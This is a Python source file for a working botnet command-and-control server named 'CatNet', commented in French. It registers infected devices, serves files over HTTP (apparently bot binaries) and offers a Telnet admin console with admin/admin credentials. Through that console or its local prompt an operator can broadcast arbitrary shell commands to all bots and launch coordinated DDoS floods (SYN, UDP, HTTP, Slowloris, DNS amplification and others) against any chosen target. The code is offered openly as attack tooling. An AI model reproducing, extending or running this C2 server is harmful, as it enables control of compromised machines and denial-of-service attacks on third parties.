#!/usr/bin/env python3
import socket
import threading
import time
import sys
import os
import http.server
import socketserver
import random
import string
from datetime import datetime

# Configuration
HOST = '0.0.0.0'
PORT = 1337
HTTP_PORT = 80
ADMIN_PORT = 2323 # Port pour connexion PuTTY/Telnet
MAX_CONNECTIONS = 900
BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))

DDOS_METHODS = {
    "syn": "Flood SYN", "ack": "Flood ACK", "udp": "Flood UDP",
    "tcp": "Flood TCP", "icmp": "Flood ICMP", "http": "Flood HTTP",
    "slowloris": "Slowloris", "rudy": "RUDY", "arme": "ARME",
    "hulk": "HULK", "mix": "Mix", "bypass": "Bypass",
    "dns": "DNS Amplification", "vse": "Valve Source Engine"
}

class BotnetC2:
    def __init__(self):
        self.connected_bots = []
        self.lock = threading.Lock()
        self.total_infections = 0
        self.total_commands = 0
        self.active_ddos = 0
        self.running = True

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    def handle_bot(self, client_socket, address):
        bot_info = {
            'ip': address[0], 'port': address[1],
            'connected_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'socket': client_socket, 'arch': 'unknown',
            'hostname': 'unknown', 'system_info': '', 'tasks': [],
            'device_id': 'unknown', 'status': 'connected'
        }
        
        try:
            client_socket.settimeout(60)
            data = client_socket.recv(1024).decode('utf-8', errors='ignore')
            
            if data and 'BOT_CONNECTED' in data:
                with self.lock:
                    self.total_infections += 1
                
                parts = data.split('|')
                if len(parts) >= 3:
                    bot_info['device_id'] = parts[1].strip()
                    bot_info['system_info'] = parts[2].strip()
                    if 'Hostname:' in bot_info['system_info']:
                        bot_info['hostname'] = bot_info['system_info'].split('\n')[0].split('Hostname:')[1].strip()
                    
                    for arch in ['mips', 'arm', 'x86_64', 'x86']:
                        if arch in bot_info['system_info'].lower():
                            bot_info['arch'] = arch
                            break
                
                with self.lock:
                    self.connected_bots.append(bot_info)
                self.log(f"Nouveau bot: {address[0]} (ID: {bot_info['device_id']})")
                client_socket.send("PING".encode('utf-8'))

            while self.running:
                try:
                    data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                    if not data: break
                    
                    if data.startswith("SCAN_RESULT|"):
                        self.log(f"Scan {address[0]}: {data.split('|')[1]}")
                    elif data.startswith("DDOS_STARTED|"):
                        with self.lock: self.active_ddos += 1
                        self.log(f"DDoS start: {address[0]} -> {data.split('|')[1]}")
                    elif data.startswith("VERIFY_INFECTION|"):
                        self.log(f"Infection vérifiée pour {address[0]}: {data.split('|')[1]}")
                    elif data == "PONG":
                        pass
                except socket.timeout:
                    try:
                        client_socket.send("PING".encode('utf-8'))
                    except: break
                except Exception:
                    break
        finally:
            with self.lock:
                if bot_info in self.connected_bots:
                    self.connected_bots.remove(bot_info)
            client_socket.close()
            self.log(f"Bot déconnecté: {address[0]}")

    def broadcast(self, command):
        count = 0
        with self.lock:
            for bot in self.connected_bots:
                try:
                    bot['socket'].send(command.encode('utf-8'))
                    bot['tasks'].append(command)
                    count += 1
                except: pass
        self.total_commands += count
        return count

    def command_interface(self):
        while self.running:
            try:
                cmd = input(f"\n[Bots: {len(self.connected_bots)}] > ").strip().split()
                if not cmd: continue
                self.process_command(cmd, sys.stdout)
            except EOFError:
                break

    def process_command(self, cmd, out):
        action = cmd[0]
        if action == "list":
            with self.lock:
                out.write(f"{'ID':<5} | {'IP':<15} | {'Hostname':<20} | {'Arch':<10}\n")
                out.write("-" * 60 + "\n")
                for i, b in enumerate(self.connected_bots):
                    out.write(f"{i:<5} | {b['ip']:<15} | {b['hostname']:<20} | {b['arch']:<10}\n")
        elif action == "broadcast" and len(cmd) > 1:
            n = self.broadcast("EXEC " + " ".join(cmd[1:]))
            out.write(f"Envoyé à {n} bots\n")
        elif action == "ddos-all" and len(cmd) > 2:
            target = cmd[1]
            duration = cmd[2]
            method = cmd[3] if len(cmd) > 3 else 'mix'
            port = cmd[4] if len(cmd) > 4 else '80'
            n = self.broadcast(f"DDOS {target} {port} {duration} {method}")
            out.write(f"Attaque {method} lancée sur {target}:{port} pendant {duration}s avec {n} bots\n")
        elif action == "status":
            out.write(f"Infections: {self.total_infections} | DDoS: {self.active_ddos}\n")
        elif action == "help":
            out.write("Commandes: list, broadcast <cmd>, ddos-all <target> <duration> <method> [port], status, exit\n")
        elif action == "exit":
            self.running = False
            sys.exit(0)

    def read_line(self, sock):
        """Lit une ligne depuis le socket Telnet en gérant les retours à la ligne divers."""
        line = b""
        while True:
            try:
                char = sock.recv(1)
                if not char: return None
                if char == b"\n": break
                if char == b"\r": continue
                line += char
            except: return None
        return line.decode('utf-8', errors='ignore').strip()

    def handle_admin(self, admin_socket, address):
        try:
            # Désactiver l'écho local Telnet (pour que le serveur gère l'affichage si besoin)
            # IAC WILL ECHO (255 251 1)
            admin_socket.send(bytes([255, 251, 1]))
            
            admin_socket.send(b"\r\nCatNet Admin Login: ")
            login = self.read_line(admin_socket)
            if login is None: return
            
            admin_socket.send(b"Password: ")
            password = self.read_line(admin_socket)
            if password is None: return
            
            if login == "admin" and password == "admin":
                admin_socket.send(b"\r\nWelcome to CatNet C2 Admin Interface\r\n")
                admin_socket.send(b"Type 'help' for commands or 'logout' to exit.\r\n")
                
                while self.running:
                    admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
                    data = self.read_line(admin_socket)
                    if not data: break
                    if data == "logout": break
                    if data == "exit": 
                        self.running = False
                        sys.exit(0)
                    
                    cmd = data.split()
                    if not cmd: continue
                    
                    import io
                    output = io.StringIO()
                    self.process_command(cmd, output)
                    admin_socket.send(output.getvalue().replace("\n", "\r\n").encode())
            else:
                admin_socket.send(b"Login failed.\r\n")
        except Exception as e:
            self.log(f"Erreur session admin: {e}", "ERROR")
        finally:
            admin_socket.close()

    def admin_listener(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, ADMIN_PORT))
            server.listen(5)
            self.log(f"Admin C2 démarré sur {ADMIN_PORT} (PuTTY)")
            while self.running:
                client, addr = server.accept()
                threading.Thread(target=self.handle_admin, args=(client, addr), daemon=True).start()
        except Exception as e:
            self.log(f"Erreur Admin C2: {e}", "ERROR")
        finally:
            server.close()

    def run_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, PORT))
            server.listen(MAX_CONNECTIONS)
            self.log(f"C2 démarré sur {PORT}")
            while self.running:
                client, addr = server.accept()
                threading.Thread(target=self.handle_bot, args=(client, addr), daemon=True).start()
        except Exception as e:
            self.log(f"Erreur serveur: {e}", "ERROR")
        finally:
            server.close()

def start_http():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args): pass
    try:
        httpd = socketserver.ThreadingTCPServer((HOST, HTTP_PORT), Handler)
        httpd.serve_forever()
    except: pass

if __name__ == "__main__":
    c2 = BotnetC2()
    threading.Thread(target=start_http, daemon=True).start()
    threading.Thread(target=c2.run_server, daemon=True).start()
    threading.Thread(target=c2.admin_listener, daemon=True).start()
    c2.command_interface()
